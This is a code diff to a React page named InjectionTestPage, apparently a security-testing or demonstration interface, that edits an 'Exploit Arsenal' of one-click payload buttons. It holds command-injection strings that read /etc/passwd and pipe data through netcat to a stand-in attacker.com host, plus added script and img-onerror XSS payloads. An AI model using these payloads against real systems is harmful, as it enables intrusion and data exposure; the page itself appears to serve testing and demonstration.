@@ -83,7 +83,7 @@ export default function InjectionTestPage() {
                   <Input
                     type="text"
                     className="bg-black/80 border-primary/40 text-primary h-14 pl-16 focus-visible:ring-primary focus-visible:ring-offset-0 focus-visible:border-primary font-mono placeholder:text-primary/20 transition-all text-sm rounded-md shadow-[inset_0_0_15px_rgba(0,255,0,0.05)]"
-                    placeholder="Enter command (e.g., echo SYSTEM_OK)"
+                    placeholder="Enter command or injection payload..."
                     value={cmd}
                     onChange={(e) => setCmd(e.target.value)}
                     required
@@ -134,21 +134,25 @@ export default function InjectionTestPage() {
              <span className="w-1.5 h-1.5 bg-primary rotate-45"></span> Exploit Arsenal
           </p>
           <div className="grid grid-cols-1 md:grid-cols-2 gap-3 w-full opacity-80 text-xs font-mono text-primary/70">
-            <button type="button" onClick={() => handleQuickInject('127.0.0.1; ls -la')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
-              <span><code>127.0.0.1; ls -la</code></span>
-              <ArrowRight className="w-3 h-3 opacity-0 group-hover/cmd:opacity-100 transition-opacity" />
-            </button>
             <button type="button" onClick={() => handleQuickInject('ping 8.8.8.8 && cat /etc/passwd')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
-              <span><code>ping 8.8.8.8 && cat /etc/passwd</code></span>
+              <span><code>ping && cat /etc/passwd</code></span>
               <ArrowRight className="w-3 h-3 opacity-0 group-hover/cmd:opacity-100 transition-opacity" />
             </button>
-            <button type="button" onClick={() => handleQuickInject('echo test | nc attacker.com 4444')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd md:col-span-2">
-              <span><code>echo test | nc attacker.com 4444</code></span>
+            <button type="button" onClick={() => handleQuickInject('echo test | nc attacker.com 4444')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
+              <span><code>echo | nc attacker.com</code></span>
+              <ArrowRight className="w-3 h-3 opacity-0 group-hover/cmd:opacity-100 transition-opacity" />
+            </button>
+            <button type="button" onClick={() => handleQuickInject('<script>alert("hacked")</script>')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
+              <span><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></span>
+              <ArrowRight className="w-3 h-3 opacity-0 group-hover/cmd:opacity-100 transition-opacity" />
+            </button>
+            <button type="button" onClick={() => handleQuickInject('<img src=x onerror=alert(1)>')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
+              <span><code>&lt;img src=x onerror=...&gt;</code></span>
               <ArrowRight className="w-3 h-3 opacity-0 group-hover/cmd:opacity-100 transition-opacity" />
             </button>
           </div>
           <p className="mt-5 text-[10px] text-primary/40 font-mono tracking-widest uppercase text-center w-full">
-            Any attempt to execute shell metacharacters will trigger automated containment.
+            Any attempt to execute shell metacharacters or inject malicious scripts will trigger automated containment.
           </p>
         </CardFooter>
       </Card>
